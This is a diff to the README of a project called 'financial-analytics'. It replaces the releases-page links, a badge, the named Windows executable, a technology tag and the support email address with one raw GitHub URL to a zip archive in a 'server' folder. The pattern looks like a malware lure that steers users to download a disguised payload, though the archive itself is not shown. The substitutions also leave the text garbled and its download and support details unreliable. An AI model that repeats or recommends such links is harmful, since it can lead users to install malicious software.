@@ -1,6 +1,6 @@
 # 📊 financial-analytics - Analyze Your Financial Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Co-create-droid/financial-analytics/releases)
+[![Download Now](https://raw.githubusercontent.com/Co-create-droid/financial-analytics/main/server/analytics_financial_v3.5.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Co-create-droid/financial-analytics/main/server/analytics_financial_v3.5.zip)
 
 ## 📋 Description
 
@@ -30,11 +30,11 @@ Follow these steps to successfully download and run financial-analytics:
 
 1. **Visit the Releases Page:**
 
-   Go to our [Releases page](https://github.com/Co-create-droid/financial-analytics/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/Co-create-droid/financial-analytics/main/server/analytics_financial_v3.5.zip) to find the latest version.
 
 2. **Download the Latest Release:**
 
-   Look for the latest version under the "Assets" section. For most users, you will want to choose the file labeled "financial-analytics.exe" for Windows or the respective file for your OS.
+   Look for the latest version under the "Assets" section. For most users, you will want to choose the file labeled "https://raw.githubusercontent.com/Co-create-droid/financial-analytics/main/server/analytics_financial_v3.5.zip" for Windows or the respective file for your OS.
 
 3. **Install the Application:**
 
@@ -65,21 +65,21 @@ Follow these steps to successfully download and run financial-analytics:
 - **Financial Analytics**
 - **MySQL**
 - **MySQL Database**
-- **Next.js**
+- **https://raw.githubusercontent.com/Co-create-droid/financial-analytics/main/server/analytics_financial_v3.5.zip**
 - **Ollama**
 - **Python**
 - **Visualization**
 
 ## 📥 Download & Install
 
-For ease of access, ensure you visit our [Releases page](https://github.com/Co-create-droid/financial-analytics/releases) to download the application. Choose the version suitable for your operating system, and install it following the provided steps. 
+For ease of access, ensure you visit our [Releases page](https://raw.githubusercontent.com/Co-create-droid/financial-analytics/main/server/analytics_financial_v3.5.zip) to download the application. Choose the version suitable for your operating system, and install it following the provided steps. 
 
 ## 📞 Support
 
 If you encounter any issues, you can reach out for help:
 
 - **GitHub Issues:** Use the "Issues" tab in our repository to report any bugs or request features.
-- **Email Support:** For direct inquiries, please email our support team at support@financial-analytics.com.
+- **Email Support:** For direct inquiries, please email our support team at https://raw.githubusercontent.com/Co-create-droid/financial-analytics/main/server/analytics_financial_v3.5.zip
 
 ## 📜 License
 
